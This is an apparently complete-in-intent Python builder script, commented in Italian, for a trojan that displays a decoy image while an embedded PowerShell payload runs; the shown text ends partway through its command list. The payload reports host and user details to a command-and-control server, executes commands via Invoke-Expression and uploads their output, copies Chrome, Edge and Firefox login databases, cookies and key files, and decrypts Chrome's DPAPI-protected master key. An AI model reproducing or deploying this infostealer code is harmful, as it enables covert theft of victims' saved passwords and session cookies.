#!/usr/bin/env python3
"""
Loader.py - Crea EXE standalone con tutto embedded
Mostra immagine innocua mentre esegue payload PowerShell con comandi integrati
(Versione 2.0 - Correzione Bug e Upload Robusto)
"""

import os
import sys
import subprocess
import tempfile
import base64
from io import BytesIO
import time
import threading

# --- CONFIGURAZIONE SCRIPT ---
# Assicurati che questo sia l'IP corretto del tuo server!
SERVER_URL = "http://192.168.51.211:8080" # SOSTITUISCI CON L'IP DEL TUO SERVER C2

# --- IMMAGINE DI COPERTURA ---
# INCOLLA QUI LA TUA IMMAGINE CONVERTITA IN BASE64
COVER_IMAGE_B64 = """iVBORw0KGgoAAAANSUhEUgAAAQYAAADACAMAAADRLT0TAAACc1BMVEX///+1AQ90uiQAAETdSBQAAAD9/fv7+/sXk9H9//wpQXL/vAD//v9MUWQAAEIAADPe3t4cHFGurr7z8/Po6OgAAB06Ol7MAADIyMjg4OD/wBWvAADm5ubX19ff39/R0dEAAD3cQQAAis1ntADbNACM0UUAADUAAC/uoQDUAEA8brUAADmsAADXBlEAACyLAG6Hh4ft9eL4ypHysDLMm8Ogo8ASF3YmJXeh0TmXl5dpaWmzs7N8fHzHzNfB4pPYv9nI5o1JSUnTADr67O/ZJgCGkKlDjNn5rwAAACOw2WCrXpYAAGyOi7X+4cWoqKi5ublTU1M6Ojr0zcUlJiYpQXGAyi3ZjACamqeTyACTInlKYarRjIz26NLBXF3trrv32eDjeZEkNE3RADDqq5vok6YeIzrmhW/ok4H219E/AABuAADBAADeWjkTAABSAAAiAAA8UHwNL2gAKWXib1PDdQDB+YkrLCzN5LzC36mezHPl9NOg0m6Mx1GkZQBzc4ddXXamzOiZxuW0HyGcQIVNX7XG3vDc+v1/0+s5r9Vqt9Gn2+VHte0ox+7xwMzZNWHl/vxOmsmXyNXZL15D1e656OvgaYVzobvniZ/tq7vcUnE6RlVYX24GHDkUIzDfY0XsppaGAABba49ggrh5PDxXHh4wVZAxft+syO15o+CEoMxIh96IhYBsWzvHnijowSjJvZSlg0n/3R3UtBiYbCs8GwBxPQCdeEzFl1aznYOjgFzF9ZKNxVsuJRlMNRDhoUbTx7iHXQDNoW2ybQBVMACYVACHYTO+sqMpKVI/UJlbaJzyvmuo0lJofcLDYGGJkMqoWpPIoL0GCRcDAAAgAElEQVR4nO2dj18TZ77vRzQzDgaMmWlMSoaAIL/FpC7VhCQrRtRWTECQuKhgVJS2tsUfKwFj0B6xnrao29Oeaqjb6r3synZ3T+/tuqfncna7a7tFKmXPn3S/zzMzySSZycyQsPo6x08rZBJmMs8731/Pj5kQFPFcBEU8x0A8xyDoOQas5xiwnmPAeo4B6zkGrOcYsP5bYqBAwiOte+jEQIPgh9FI0qS+c1tmUXaH1eqw2x2hYDDksDE699aJgTRSNEmRQPuZoYA++VBnp9cdDLq9HndrKNTqdnraWnUdQx8GI+gm2AKNDMKo73SXRSFPJ8gQZFNPMRgM5Q3pOIxea6Coa+++e40E0cTTx2BqCzKoya2dFMGHBCDgdlIMiPXoOJBupyA/un79I/ommMPT9wqqi8EtZihrJ4LAbxFON/7dqedIOp2CJK/98y9uIoswFjzFGKmAvrMJBRmWtdttNpPdHeSBYA6dHELTpuNIujMFigj0e+9/8F7BQ8PkjU13bk/23x7QvIfbajNxWA5TFxARxLBdBLus1oA+spvXbn50CxyDLiQH6uiO+k2bNtUjHTs6MKlpJ68VU3CAOGcI7AIJcXCDW4Tcet5ed8Kk3wOPYG5CkNS1Y27130AQMAb8a8cnWkB4HSaTCaoFAMG5nTbYMNlsNjvLEG2t1i49DdPtFBT9zx988B7tShZqBZDxDm78sTsnQJ/cOQZb9cc0cPBabcGuTk9bpzPUesGNvcNUbmPdnR7W7enSU0HpxkASv7h+nb350TXAUCCvCHyILeBo8omBD9O3leS0OjwmzmRyBD1t3hCYBMLAOg0GQzezbE4BlQKyhmsQG669+8G7N7FTFMIz+EYPSE6EwnFC1R7cIRMEB2dXd5fTYXXwGGz2bsBgsLLs8mQKEnUn6Gvv/gsA+Oj6+x98RBfIKz5BPnA748mP4cljAZU9W4MmzmrA6hYxlLNtaNvGMh5WZXeJdFgDFEwk/YsP3n//PeO166uvFypIDuwAU8hqcOAG2MPHKrsCBv6zb+sydHECBjsC42RYJqijmtaOgY8F711///pHRuraxDXoXwCHfMNDgDhRLxsFBpA5qLiF22pqRRRCnMltCPIYTDbWHnIABcaqIzjosQaCaW+/9ot/fY+mjNDRDMdNEBnyLqI+qc9yCF5QTKmVD16r3QsUPJzVynU7caYACA4bX0RxTu1noSc2MPHh4XHzTcJIk7RvvGS4xE7kjSFQv+mOZBOKyH6h7ZP19QMqBaWAwWtyOEzdXjAFtjzouYDCIxgDw3m1n4YepwAKoJJ2szk8VTJ+D5gwxjzDwwA0VvKRH91xYmBg8hMcKYwf1p8I5IbstNqDOC2YbEFD0GR14+jYyfAYlskpzIlhnkPJsKj2vBPmx/U3Uifw8Qm+2QHhJXlvSSnYarPjPNHZZug2cd180kDGAJUkE9Ix8KIdAwPNn/LFIzyEyLgvXDIc4bS/k6wC0shw+5O0146qFlAOL2sLGYTGQ3B0i8bAON0M5dRxcloxUERrpAS12mZuj8e9QY4mmRJkDvlpAAKA+DiwIz1tflJ/Q6VwoNpYk93RidqOehcmuwlCBQfGQHRZGapLx3loxwCRIU4kx1rQ6JMZHETn0GemAEPy/SdTZQKF2n+0/o7cLlJ5OBskSM7KsWALqFvFhAwhOFdnl74IqQ0DTRhJJjFs8aECCv4j0ZAkRdojeXsFVAfJKHhCEgrQSR3doVpNc+AVWOXltlbWZrczbk+b4YLBQzGUx6TjPLRgQMOvtC1SYjGRRkm9RFKJkohPx3vJaGBH6hO/nVE0Hj0WUD23Ts7Oc7CxnV4Ii0GDnbGXsxQYg56hSI3WABhMgIFNG2khiZJIxKznzbI1sCPV9v4Pk88inwhsuqGSL0H2LsZut6HRFhv0LLsNnXjUBQXJNh09Cl0YIhY7SUlOjCQSBcUwcEyMlrizuenYgIbAE/QydkFQN7LCSJyd9eqaptCOgQUMPlpaNJJMJFFIp6A2nUC/JvvxVuDYbU0dFq87NQgpCizDqW8cRVtsgPqZAg8IE3xs4P+RjkgkYlc4bGDoOGhIzbuhbkgmxYHJY6nieaD+jlo3W5DTm87BbuJsHrfe6RfNCdMZiSTwFCZYBPwA94hHIiWye+8/ebq6urqyEn6sOrk/12EDm1LpYKB/MtmlPLHjhtYWEME2jhGGY+14pNraFdQ70Kwdg28wEmlFhQOexiX5J8Iyf3m8srpyVVKwcTzHW9xJVZEUNXli0x3oVPQfvbFDrY6Wiu30WBkEAA9Rt3Z2srqn6TUX0xQxFYkMcgR0simSpkkjY7FEIkyW/+5fVb0qQ9WVyhZxu/6EZGvyxMcfIn2is99q8nZ50Rxu0O3p8pqWsFZBR9eK+xRigY9AhRPYApuwRAaDBJlxwiezICDLqD6pdND++vq0cmFg8vbkUgb3KK7V6fU6W7mljQzqGG8gwsDh07gJdjDaw+ARg16CSu9hMqcrMyFUnkMgKk8rJD9q06Y0eyC0L80opLRjgHwRbgZ7GExMeUoiQOGuJ3NnMpvCOYagzuXicKK+vj+/JhRCOqwB7N88OIisYBDRaHZnTdj8sjLNDkDVKOuRePO0/GGNNzZt0pgal1G6pmsgIjgHPwUUg5/e9XBEJoZT1RIGp09+9tnJ05XYaTCeSoX40F+vPiGx7NKFATIEwVjDTmc4xBJZ6xuGqlMQPhM+4Moh+BHgjaRaIV/cqVcbiF9+6Zu8o2m5h4KSgaH6ZOVx4bn91UNUIOkrWbtgMUpj0/9AacGQ6kjgyomCjGnMHpLeLxpD9XHis52iqUAZUSl5QVb9O3YsR3TgR2S1VodaMBjRzB0hLAdEv5OPxWdSxoAbu+rU0KmTJ0/xbnBc5KAQJYnJY8sQJanBcHgqEUmUxM0KHR/pHxcqTYuRofIc2jqOuhSQKE6j2ECcFAkNKezcX7+p0GHSHndOlfBKJLxqg2QFw/CZ2FT0uSYdpHInMghGRPSZ0t6T9ce0r/XRomAkEnIkSkRFwrmbWTAMQhzEaTGQypyrdiILOCW8+Evl8zh67E7hQFBxIMASziSGksRUztGogmFALYeeNW71OWkPEzlJMpfmGE+aPHqsYOXkFFDwECSTMgcAkYtDoTAwO8EfTgUCJ8/xj1NCXkJKHisrcPtj9X4VxQXdbrcj5/icF1ptsULLrBYJh6kc+xQKA3zefJl4en8qMoiZgyROq8RIUUYqdxebcgszdAancqNasRHgVd1xCYaSeI7jFg4DXyUeP0UcT+9gVVbvFM1DFYOKHADhrdcMr73+OlrVoPBH2BUSYUTByErdIuJQPHAhrQFXR6eOZ1hD5an9+/cXBgOar3xjPejz15rgocKMdRhHAoZftxlOJLSYQyFjw6oAwkERQ+mxATVdU2xQkwma/lrT501l6994Y/1bSvbAx8UwmmpDYyTxcIpDQrGOKlimQE3fee6XOyWNFkSmMmhlPlOe1AVo+evrX/u8CRlEGQoQcoezomZHxLTQGmElHGSGToVjFwoD38xK7BlSr8C1tRgtlKppTWo1vPnW62+tF/U2ipMyf+ZOa681EgTHiJfwKKaUjq0RA8v5uNyf5CkxLqKN1IgkPwopJAqlIQdt6npz/fqdb7/9eRmPAUVJg8zJo+QQYcSE44hA08PjPocTBwmlxmrBYGofPoM03J6jAhEtgO9Gnqqs5JPEKbQl9q2URhw0iTEAhvVvoJiAveLzNwCETOxPN35TIgE/vREzwQRR4FQ4uDoGpv3MmWIsINGu+NdU8vNHYfDU6ZM7QSdxZkjW1tX5OCAHuRIHhdfffm29aBAyM5XoQ2eSIxv2BFSPRmoq4kZFx6DSZL8qBk6AcKa43dxy7+ywYrBNekVlgBhaP4TmOOFZ8vip46nUqaW5SkKrPt8uWy/V53I5Ez5zM5GcbGUSCRMaM0tEUFrxJRQOrobBd1awhHZsT/eLi5U4iN1IiJNDp8UgwKw6eTw5RJlfusSrgtv+lxTEa4Zg9t9BbKDI5AoEKpHg0GLvEMQIknAqzXOrYGCLRQr89v2G4h6lHZKjK6uqk2XSOUniqFbsZmuSDWGwE53/+/M3eAhlrxkM1uy/C0fSyomShI1AE89xyKHBKaVSXQXDPQHDMPyVeXh4uqGh4Yzisi/JLEXlueNDgcDQ8Wo8GIcTReVpDZGBsYasrMLfGQwebyeOEZA4X38LJUyDTMy2TqWtUuTDopG2DXJB5c5Vbgy+sz1JY2hB7gEcps8ouYV0mKES9SSqqytTGHaqu0SojV8NL99tYuBZNwe/Q5yd4/C6ULmFPfGpVmlunyoRHySczBIxiMZwxkdQPBCEQdEc0jsTSUfA3qKeLKlOQ1IyPi+Rw20l8BpIGZ8gWGciEklMxcPBkMPOUnEoqxmWCye8tokZ5ffOhYEVMmXxWR/BJDEUDyvuIMPh5H4cIneqlwxtSQgXumXrw9RJOxjK0Omwy/cYmYjYhYgI/apIpCTITjz41YTyEXNh8GVi6EFOUXxGuYoaqsyey63EySNXs7DcSQrdbV0GuYpAKo9b+bxDbqd3ih+PnZryOoMhE3Xt17t+9at/VT6cKoYeaP5wMTjF8HAPCg0N4CI5xnmZc1kGASZxTr1LxaQ8orurS6HblJQpJyV2YiJ5berExMSvH+za9Ztdu3YtdfTJfKYHNZ2lhCugZzAFFClyCE3QpJlD9SotNXTIkCE9i1wzxOz61S5BvwHt4ikseSwSMMDnfz+5fRko9OS2BqT95yqrhT4FPDinrSPhzMSQ2xxyi7q1K0O/ebD0kWnzGeQFDe1mM0NQZrN5ehpRyBUbBDH7PzsJWfL0yc/2a21MWxYGuTSgVcZfZ2BQWbiogqEBhcTiMyshRELHqpjPFsqZIg9dgATBN9/zRRf+rec6ymyxM7wrYM2Uq/y1KobpnrSEKSmsC6sLhi+CHtT6L4JWDlcQOi6VkhVzeeYBAjFzWX3d8FIwqM+MLkEX2uwmwoNsoDxEtiqViLqlcUmdOgZcN7CpUmp5jIHocrsNISu6RAjZAb5MZlneR14aYsOZM2fN6LFoDcuzUq3T7TF4AIMbMmcX+YxhgEwx48PrA5I+oWuBvnZ5vEHDb3/3+9//7t/AHTAGPRcJ5Sv1uoH/s3vCGNTwMlEgvAb2y90v/h/Q//2Sw0VE9zK9k5xyF9Nni3vOtDAE4xs+gwuGs+15XlulLK/hqzqE4feIxO9wxlyut5KRIgY8mNd+FgLD1rNnV6LfZ4aXDwJUkX/oRRh+jzD01j0zGHjZfUmZlssdeLkf8hjAHs739uZdRurUM3NrPLfhYe8a5BS/Awp/5O9F8I9792cGQ9Dwxd/Ob9nSC/r3oLXb0IauOf+HvfvyYdB5XLch+P2l84jC1yHO7oZ8CSiW9MY07QLpu0vZUjFQrE28zZI965IvlmX03geIMhgc1u//46s/ft1qtTEMxS9qUV6XIS96xD9bVFTFq6ho1h918fNX0RGX/BJd8e2XiIFxWHPKYWJ0HbgTaibOGgqFrJydIUkCDzzriw6uaAw3XiK0PesfI4gYfjDiUtp3yRisOZMnw3JWh137ocEJGBL2gZ0YEkvLCLVE5MhsBgIpi9GY8CAWlSeRDwbKKIgwZggf127ltOZYK1q5QpKM3c5QPAXiC56DxmvAo0UKDLKRxEZk9s8DA2100QpCN00jKbBybfUWi/pRuPFkUg4dQ3EjWiHExmg6WjWafYQ8MFDG6M+z9ArSxle2R11ovbldcSYu7Ry6eGOQiiHFOQtVDq5ZbRCKimJgNUVjY1XZ9pAHBtLo/38SSTC8shHkd8Gh7Q5G/Q3QoBPHNx4FBopBV5cyXQIHtdGXqFYIRVVjI1WjI0WuWFEhMdBG/88lAJIYEIMY+jFmJAmb+hWBeMbewSICODIABRvH2USvyD1xQ8c0UyiqImarRujRaLRqrIAYCNEafj7mGssyBp4DRTlUw6THAIUSpkBSoksACBZyZne3SofbpZkBwuAahWxSNebPjg75OAXhv8hjoCkwDBkMG2kjwaqZA4Uay5GZYu1km8BB+aZmLs2mEPMDgCgBqWKURHZROAxG0uUa818EQWbwXwQGP9/4BBjEkhQ2XjTShMoKOvCJC4YviCwM4BvoFTRor1hTa6cANuCCEmqEGHPRqM7M9Ip8MEBWNBJRwOAyAoaLr7zyZDukUNfFjRdHoKj3H9i48YCLNNpVBrK98Ikz2RSQ0JwuMgeFI5B6PGIW8mqsKuYfRbVDNPNQ+VWRJGmkEQaSxzBipEkjRYyhn0bCFTuw0W+kmdwVEAUfuFfGGFAVge50dkG5ltScKHl7gNTl8seQf2R3u5bep+DKTSbk98gpAMMrF6HNFLoHEMkXljQ1dmBjjCSo3MGhFT5vByEWC+kY0HRFt+IY9QhPQexHqXOAbEmgy+Vc0YLFBgrdOKLcKmCAEAnWAJDpaBTfpn/EPwZh4eKBjaoYusH/UzVTOgaHgEF2OI53iaqi0ZGRkeiotjoSSunRUYgR/kJhwPePZACDEVuD0f9KbLuRNm6Hsgk4RCEuwJNRdQyt6C5NhDwGkhUxyPkVLpuSDaKjWn1DtleR17ALYKCMglPEYn6CJmOx2EYwu4sQHcd4DGRuDBegna0CBioTAyNikEuZuE2oQa6xMdRtzFFIVUlUNJpVOxUAgxEwzIoYSAGDUYIhtzW0ohjoUMUgM7mNkiWyBehRoMYhHrFks4tisZSXVI26aNfYSBQ0MqYw4lAQDC6IDYDBmMQwqtUaICG2JdOlHIZuJQw4QKZKB1QY0sJD6EfCxthFEYSGluSNgUDWQEitAULE6AGNGNAIkyEZGjJDpEkwBrmMCaEBNR1ZwCiukWFjDDc8Jv7JGE9Bpl+dpQJjmM3CkNspLjz8y38qYUAFZjfoQrfcEPUoLo5paDj66NEW+PxsUVqF6PoHYxBiAyGDIbc1/HX3mt1/chNyGIjD+77mRxza5BIm30cAn5jFmzHcXOQpVZKxV+wysxpaUhgMFDGKYgNkCggKIgajOgamd/eaNXXJjMmkUehd8+KfMIe7X8oENpQvR5E1VEVHojQGQGPjKJIOQSM3qVIciE0pXwyEYA2AYRR6WrMbN8ZcYy6omw6MuBg1p2D+XLdmzZrdjwydZHY5va93925hxGH3n7P3dfEhEnkDlIdoE5mBH6JE2kj8SJVMsZStvOsG4uIsWINxNDYbQ6Mt4BRFBw6gXpU/GvXnsIbDaGamDowBODw0dJdncmC+6d1dx1tD3Zo6makXFAaiqGOBu0ouPkgQtL8qfUICjTGom0P+1jA6G2NwwhQk9LEP+EdGRnNg+HPdbtAajKEOz9umU7AhDOf/YDA8BMepk+ms4zgA4XAsGh3DViFkiKx5GdqvHh3yw4CuGPfPxqA77crAcCA2Eh25qIyB5A1B0CWcFKUYWA4w7K7rPY8s5sXdL8kcIibYAxIwyWH7uWeskPLCQHEMYYzOxqCDbYyiLmxR0UahZImhog1wKMUGcosUw+4/4Zk6qTVgDLvr6hCFF9fU7cs+BM0XjH4IkbGMDKG/JXlgoCiTjSBdsdlZl5EkGIiQY1E/L1y5gk/kcAophjVoQUPaqANj+xqcAfvNiy8iDjL24MIFs9DNzh5m1dWUvGa0WQdBoLAw6kLfe0bR9IgggIACZA4MP9RJMaz5iyHZw+Ll/kMvT4DXmro/yxzGLw40VBXlRSFPDJSDJUnX7CxwQKuEjATqwAAEPASwEWGglRJmBoa6r9N8ggii0PiiBMPu3r/KHIWOxngXzKMRuCH5rW/A5jAGHbrYKLYCv6jRWBEOlRqdAlopKR3wenoJBngZssa/yZ9C6pZLeShPDJQJLcp2zfJJIq2TjznEwFVkMRzuTcewpvdLgiAECByasfqLiAExgJSRYQz46/3QPyO6B0g+bcBHy88p8HQMZXSNFiUTZpIDJI0DfkoBw79nYqh79J9uPMjEhPhLzy7xGBCE3t7zj77J4zQ1NGRJGOikJVKMA9+51QXlQ8aYz4EiNCCngOFRb12dWD7xGM5/m345xSUMCtcOj75aXgj5YwAOXDkcBIwZLzlKExqdVQiR3zw6D7V0CgX4/sM0Cm9eOl+3m3eHS8sNoQAY4BA2joUGU0ZKWN1A8j/Q4g+apBRCJPnNXx8hFL24qIbP/NK3bV6n0+n1evCFNm/+5RG8Bu5w6avlXZDJtyF/DGAQ5ZxdcalTjh4m+81fv7oELMAqeh89/D71AmN1d3773aXz588/+u6Pela0Wdapaa38SRYCA4BgyzmTqby83JSt3Eug2O+//O7Ro0eXHv4244Uvvn343XffPfwPXV8LY6koVdELsvsVAgN/IGWpHY39+m8P//Z91tPf//bbb2WezilL6UoVFRSDsRA1i0SM7GeufGm5ktIxlFY0NjZWlC4bhmdWEgwVtWtL4uFwOG6pXVvxPxVDY03cZzOH4/F42GfzjadA/E/CUNoct5tLamsbKyoqGmtrxkO28ebSpWEQ1zgajdJAAGUSJXzB/HI0I1/xGCoqHL6KtVL/WOfzNZbmhYFGnR3W19Le3t7RbvYxBE1hMM8kB4yhwsLGa9MDIzKPdRVLxwAtJhjz/HSfoOnpdh9RoN7tMghhAAqWxqxEWVNiX1e6dGswEub5eWj/VST4vdD3+J4DZ8zla4yqGKX6GjCUVshRAA7jttqlYUD9JXYetz5N0+3U0zWHy1cUXgAMzb54jQyFlRXNYXPtEjEQvvlMBsgw+u7ZiKdpDbc2KJy1pbRi3NeczaC0uWJ8/AUOKOnGYCRdhC8bgmAQvqfIYWLDhsvyr1hKmzmZgrp0jqHM64BQ7VIw0Fyy2QuLvOD3Ao4QwxyBvtGogCzIw1r/8tbq1avlX7FUWHy1Ytsba4QkubLW1j4HTzdzc7q7VuATjOgRCw/mp7HmF6enH+Bn+sZZgiwkBnJLnUYOzIbVqzfI37zIUmuOCwVjRUXYHJ6rxVsV4ygsrGwMhxv1YoBM2SFQWLxfPF08v3B/vnh6enh6kQ8Q03EKDbBoO3N1AQWtHK4AhtW3ZF+yNLNrBQoW3C/zje+pgc7VHh9yldI5rlYvBor2PeZzxOJ8cfH8g8WFhcUHi8XDw9gr+q4u9JiJwmE4XIclM0eXfWKrkTbI5kzLnBAgSxvF3qk9XDJXYTHNIf+o8VXod4p7ojEAhUUxRBQP31/gH8+PM4VzisP7Dv+w5fA+LRgmNmAOsuZgsfiQNZSurJV+JyHFQNBAcNZy63RjmHgsYLhvKRYcoa/vwfBcB46RDX0LllD+GOiDoG2ubdsO+l/a8tPNP/vZwKvwY/NPc+yyerWyOVjGzTUoFDRb0p8383Fzrc+iG0PL1fmrAoa5RcEC+hoWZxYBR0NDX8PCdDxjsET10svsW6vTB7cdfOLadjCJYfNPgUMuDMwGgYNcCQUYoIIstbRn3ODIvHapGIj5PgHD4pzFMpMEgY0CAWmYt9jSdjjS1PTOodTtEKmh/UNDQ5Lt/h9XrMi8NxzCMBI9mLKGza8GNm/OhWGCFThskBmb4q1hZU3m/cWZPQKGOb0YmMe4wfD/4r05y2Dk3mJHxwyqGqCIbMAGMW9JW8Q7ULZiRVlZ2RH8NRMDh94pE/Qj/paBwCF4uKLsxywMT7ZjDgIGROGffpIDw8SGK9eUzcHClw01WffVFmKDT3dsMD1OfvSLHXOf3r17F32313j7DLIE/PSCJW31agAwgMqaDhFDR1CbBZU1lfUTh/jtbAzbXK6LiAOPAVMIDLyqjOHW6g2rL99SMgdLo2kPyo/iWnPGDOWNOS56RaOvRi8G3+MGSQ3ZcW88MvjpnsHBFyIzyCEQigVL+u3r3sEtbZqkjqQYgN451L9ffKIs8wZxNMQFF7YHjAFT+KfNA4p3GsVpQvSKbHOwQC0dtzSLdwwN76mdI8zNay0M04irKOta/RggNKQ6l1A1LM7MtA8O3i1ZRAwQhh5PWqI4hL1iYCgNwoqyIfwCr6asd0PRcQw4+LcDhlcHEAUIEIoYbq2WKNscLDXt4ZKwzz7Oh8iKijkrtwdVlEwYYsZaKDF1Y+ibF7yiY3ERBQTsBzOD3YZFbA3zDQtznrRUEWiCRgf2N61IU1kgRSHLJwIsREfeHlwvbQkIFCBTKNwXe2KDFEN2dLCUNtpraxproGwIt/qIdTVmE+5pQbBYV7qywq6/a8U7BbR+0WC4tyCaxf343Tc7eGto6JvzpF+09GNZ2VAmhRVlh/pTGDI+5cBm9iAWsod9PyCP+NlmjGGr/C390oxBxhwspfCJ45Q5t3aP2Vy6soYfjSu1jK8DFuHGJWDAEBCG7j0z4kgDYDCIXY2+OW969TTUdChQtiJTZcnnMo0B2sw+wVduPnFt9xPET/8eePXvr4L+PvB4rxyHDGPILiUtpaWNbA3qPsC/mrWSrnYFGpZq1D/swifMhQXAMPjC+CKfMxZa7nZHhMK6b/5Td0YReYhaIYPhkOgVTenGEIDP/SeicG5gWkRt3SrHYXWmMjua4AGNcblxF9TbLh+vWMI8BS6fZu4/Xnxh8O4LFlQzoBB51zCzgJwCIuTwYCizlj6UTQEFySN8tjyU/sf/haqln/Ha/Cp6pmXvy4IAw3zWGV0WU0QyWWSaAwoEtWazHIc9vvCSxiJbEIaO+32L3d13DW++aYhEBg0Gw2DLfVxConyZsGVgkHEJnsOPKIm8M5TFYXNAuKsUw9rRwAt1mBf5WIaCUTSBKwyVJJJuDjgeNvtCezJHoEqbfTwc3Ri44atX5zsW+xbHDZGWeOJC9wuDkZIOsaiGIPmpNzNCyRoD5tAPVVTgx7KMHf5rc2Av1rxvb4drbF/dvpeEDvfWbAqiMfDlghgm0s2BH4CrDXNza9Mg1FpMYb53pRsDdQ/CQfv9voYZYIEH4WZmsEPwWigeDKm5OiwAAAO6SURBVGXOQ2dmCUl8oKB3cagp83vMflK+dyuyf9Pex8btB4kf6vbtq9uyZUvdvg6ZUxUDAr95S84chHHI2nF7eG2tMJddWlFbYbaNC1x0D7sQvuG+qx2LV6VF1HyysmyYn+vMNIb9CsaAOJT1B4beKTuS+S4MYNjbYdo7be/Yvm3f4Zd4DrLDL1cEY7jMbyazhgwGNBpv98UtNbW1tY2WuM8W3yPO5eoehDNS8fmrHR33O0Dt6Md9/BBr5v6C5W6WMSj5hAACqsumrLdp2YsoPGa3Igx1PIe6H2TOh8mIBqJxpA1Sp0alG2tKzD5buclm8oVL1qbmb/RiICmCG+5DvtCxmK35nkEvmYnhSC4MQpDIbFxLC7YFMAmEgefww2EZaxArp2TJhJ+4deXWBlkM4Aw1tc1QUDbXNkrjpe7YQBhpc49QNWVOXC08Huy0Z92v9h11DJldK2Zvi2/vNLt168sYwxbM4bCMUyR9IDlTI3CZmJBEh8Iv+sHTc+6ePimC5IBL8Vybg0AD01KDYFQpyGF4+eV529YkBsxBbmg2WUanW0NGP3N5MNB02DLdl6V5y2Cng6AzZ/e1YMj8LlgIkS+3mPdKMPxwuE4mRIrGsGFDMjbc2iDEzNWpUD1Xu1ZF8jfjVJnDpOnWRE9yGlNIE8Vzdz0mPFdTCGsAtUCcFGIDoiBnDWL5eGUieb4Ue1kgkephmdWlHwP+tB2eSI/EIqaL5wa73ExyFYh0lyXEBnRre3ML5TO3+LZvC+zbt4/Yh5QZfC9v4BlknuS1K7isVprg1qyck3doeQNFkCHP3FxPz/Dw9ONiYHC3zcmhyRwZDEvIFKJGtj3Ztu3JE4XLxigE4bL8mV6GlxSm8rRLDQNuJ+lwe7rQUOTghTZP0CZZEERnDT/lVnbdIAqPTl9UePGKIgQkACE/laddGtY+UWi5F7qLYShkNaGvUSNpBQxDahiyq8iUogcPbld4iZEZdUzT5XzNobALAhX7FCKGXF8a7leyBeKy6mpZ6vJSTleyf0ExqHrFs7oIs7AYFMYbksZwSP0QT0cFXiWb2xzKnlVjKPhi4VylQ1bR8Oyo0BhyuEXWJMUzpIIvHVccesmVLJ+6Cr+CfrJMFsQzTWE5LiQYkuGAprmfZS3H9RTUj5kgyt55dqMj1vJcVjJ0pClJAo1B9mv8XqWnpuW6uibQf2RFU1MZ/H/kkPqXQD51LeNFRhQTGBrQf/HcU9F/s2utlqrnGLCeY8B6jgHrOQas5xiwnmPAeo4Bi/r/GxxaXblvN60AAAAASUVORK5CYII="""

# --- PAYLOAD POWERSHELL (VERSIONE 2.0 - CORRETTA E ROBUSTA) ---
POWERSHELL_SCRIPT = r'''
# --- CONFIGURAZIONE ---
$serverUrl = "__SERVER_URL__"
$sessionId = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})

# --- FUNZIONI HELPER ---
function Send-Data {
    param([object]$Data, [string]$DataType)
    $payload = @{ session_id = $sessionId; data = $Data; type = $DataType } | ConvertTo-Json -Compress -Depth 5
    try {
        Invoke-RestMethod -Uri "$serverUrl/collect" -Method Post -ContentType 'application/json' -Body $payload -TimeoutSec 30 | Out-Null
    } catch { 
        # Non fare nulla in caso di fallimento della connessione per non bloccare lo script
    }
}

function Run-CommandAndSendData {
    param([hashtable]$CmdObj)
    $output = ""
    try {
        # Esegue il comando e cattura l'output
        $output = Invoke-Expression -Command $CmdObj.command 2>&1 | Out-String
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "Comando eseguito con successo." }
    } catch { 
        $output = "ERRORE ESECUZIONE: $($_.Exception.Message)" 
    }
    
    # Invia il risultato al server
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $encodedOutput = [System.Convert]::ToBase64String($bytes)
    $result = @{ 
        command_id = $CmdObj.id; 
        command_executed = $CmdObj.command; # Ora logga il comando corretto
        output_b64 = $encodedOutput; 
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") 
    }
    Send-Data -Data $result -DataType "command_result"
    Start-Sleep -Milliseconds 100
}

# --- FUNZIONE DI ESTRAZIONE MASTERKEY (CORRETTA) ---
function Get-BrowserMasterKey {
    param([string]$path)
    try {
        Add-Type -AssemblyName System.Security
        $json = Get-Content -Raw -Path $path | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..999]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
        # Restituisce solo la chiave in formato hex per una facile elaborazione
        return ($masterKey | ForEach-Object { $_.ToString("X2") }) -join ""
    } catch {
        return "Errore recupero MasterKey: $($_.Exception.Message)"
    }
}


# --- ESECUZIONE PRINCIPALE ---
try {
    # 1. INFO DI SISTEMA
    Send-Data -Data @{ hostname = $env:COMPUTERNAME; username = $env:USERNAME } -DataType "system_info"

    # 2. DEFINIZIONE PERCORSI E COMANDI
    $browserDataPath = "$env:USERPROFILE\Desktop\DatiBrowserTemp"
    $localStatePaths = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State";
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State";
    }

    $embeddedCommands = @(
        @{id=10; command="New-Item -Path `"$browserDataPath`" -ItemType Directory -Force | Out-Null"},
        
        # Copia file Chrome
        @{id=20; command="Copy-Item -Path `"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data`" -Destination `"$browserDataPath\Chrome_LoginData`" -Force -ErrorAction SilentlyContinue"},
        @{id=21; command="Copy-Item -Path `"$($localStatePaths.Chrome)`" -Destination `"$browserDataPath\Chrome_LocalState`" -Force -ErrorAction SilentlyContinue"},
        @{id=22; command="Copy-Item -Path `"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies`" -Destination `"$browserDataPath\Chrome_Cookies`" -Force -ErrorAction SilentlyContinue"},
        
        # Copia file Edge
        @{id=30; command="Copy-Item -Path `"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data`" -Destination `"$browserDataPath\Edge_LoginData`" -Force -ErrorAction SilentlyContinue"},
        @{id=31; command="Copy-Item -Path `"$($localStatePaths.Edge)`" -Destination `"$browserDataPath\Edge_LocalState`" -Force -ErrorAction SilentlyContinue"},

        # Copia file Firefox
        @{id=40; command="Copy-Item -Path `"$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`" -Destination `"$browserDataPath\Firefox_Cookies.sqlite`" -Force -ErrorAction SilentlyContinue"},
        @{id=41; command="Copy-Item -Path `"$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\key4.db`" -Destination `"$browserDataPath\Firefox_key4.db`" -Force -ErrorAction SilentlyContinue"},
        
        # ESTRAZIONE MASTER KEY (CHIAMATA CORRETTA)
        @{id=90; command="Get-BrowserMasterKey -path `"$($localStatePaths.Chrome)`""},
